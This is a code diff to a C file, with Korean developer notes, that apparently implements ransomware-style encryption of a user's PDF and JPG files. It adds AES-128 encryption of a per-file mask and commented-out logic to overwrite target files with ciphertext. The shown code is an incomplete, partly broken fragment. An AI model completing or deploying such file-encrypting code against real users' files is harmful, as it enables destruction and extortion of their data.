@@ -223,9 +223,25 @@ void *encryption_pdfs(void *param) {
     }
     printf("\n");
 
+    // overwrite cipherText on the head of target file
+    // FILE *overwrite_fp = fopen(fileDir, "ab");
+    // rewind(overwrite_fp); // move file pointer to the head of target file
+    // fwrite(overwrite_fp, 1, 16, cipherText);  // write cipherText on target
+    // file
+    // fclose(overwrite_fp);
+
+    // mask를 AES-128 알고리즘으로 암호화
+    printf("before calling encryption: %s / length: %ld / size: %ld\n", mask,
+           strlen(mask), sizeof(mask));  // debug
+    strcpy(mask, aes_128_encryption(mask));
+    printf("after calling encryption: %s / length: %ld / size: %ld\n", mask,
+           strlen(mask), sizeof(mask));  // debug
+
+    // 암호화된 mask를 target 맨 뒤에 overwrite
+
     // 11/2 (수) 할 일
     // 1. 무작위 생성한 16바이트짜리 mask 생성 후 XOR 연산하여 cipherText
-    // 생성하여 덮어쓰기
+    // 생성하여 덮어쓰기 (복호화까지 구현하면 적용하기)
 
     // 2. mask는 AES-128 암호화하여 파일의 맨 뒷 부분에 붙이기
     // (파일 포인터 새로 만들고, 이때 모드는 wba로 하여 fwrite 연산하기)
@@ -240,6 +256,8 @@ void *encryption_pdfs(void *param) {
     fclose(fp);
     free(fileDir);
   }
+
+  return NULL;
 }
 
 void *encryption_jpgs(void *param) {
@@ -288,6 +306,8 @@ void *encryption_jpgs(void *param) {
     fclose(fp);
     free(fileDir);
   }
+
+  return NULL;
 }
 
 void *decryption_pdfs(void *param) {
@@ -323,6 +343,8 @@ void *decryption_pdfs(void *param) {
     fclose(fp);
     free(fileDir);
   }
+
+  return NULL;
 }
 
 void *decryption_jpgs(void *param) {
@@ -358,4 +380,6 @@ void *decryption_jpgs(void *param) {
     fclose(fp);
     free(fileDir);
   }
+
+  return NULL;
 }
